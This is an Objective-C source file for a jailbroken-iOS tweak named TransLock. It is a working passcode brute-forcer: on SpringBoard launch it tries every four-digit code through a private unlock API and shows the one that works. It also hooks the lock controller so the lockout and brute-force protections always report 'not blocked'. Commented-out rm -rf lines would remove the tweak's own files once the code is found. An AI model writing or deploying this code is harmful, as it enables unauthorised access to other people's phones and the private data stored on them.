@interface SBDeviceLockController
+ (id)sharedController;
- (BOOL)attemptDeviceUnlockWithPassword:(id)password appRequested:(BOOL)requested;
@end

@interface SBLockScreenManager
+ (id)sharedInstance;
- (_Bool)attemptUnlockWithPasscode:(id)arg1;
@end

@interface TransLock : NSObject
+ (id)sharedInstance;
- (void)bruteforce;
@end

NSString *numString;

@implementation TransLock
+ (instancetype)sharedInstance {
	static TransLock *__sharedInstance;
	static dispatch_once_t onceToken;
    
	dispatch_once(&onceToken, ^{
		__sharedInstance = [[self alloc] init];
	});

	return __sharedInstance;
}

- (void)bruteforce {
	NSString *oneZeroString = @"0";
	NSString *twoZeroString = @"00";
	NSString *threeZeroString = @"000";
		
	for (int i = 1; i <= 9999; i++)
	{
		numString = [NSString stringWithFormat:@"%d", i];
		switch ([numString length])
		{
			case 1:
				{
					numString = [threeZeroString stringByAppendingString:numString];
					break;
				}
			case 2:
				{
					numString = [twoZeroString stringByAppendingString:numString];
					break;
				}
			case 3:
				{
					numString = [oneZeroString stringByAppendingString:numString];
					break;
				}
			default:
				break;
		}
		NSLog(@"Testing : %@", numString);
		if ([[%c(SBDeviceLockController) sharedController] attemptDeviceUnlockWithPassword:numString appRequested:NO]) {
			[[[UIAlertView alloc] initWithTitle:@"TransLock" message:[NSString stringWithFormat:@"Password is %@", numString] delegate:nil cancelButtonTitle:@"Dismiss" otherButtonTitles:nil] show];
			NSLog(@"Password is : %@", numString);
			// system("rm -rf /Library/MobileSubstrate/DynamicLibraries/libTransLock.dylib");
			// system("rm -rf /Library/MobileSubstrate/DynamicLibraries/libTransLock.plist");
			break;
		}
	}

}
@end 

%hook SBFDeviceLockController
- (bool)_temporarilyBlocked {
	return NO;
}

- (bool)isPasscodeLockedOrBlocked {
	return NO;
}

- (bool)isBlocked {
	return NO;
}
%end

%hook SpringBoard
- (void)applicationDidFinishLaunching:(id)arg1 {
	%orig;

	[[TransLock sharedInstance] bruteforce];
}
%end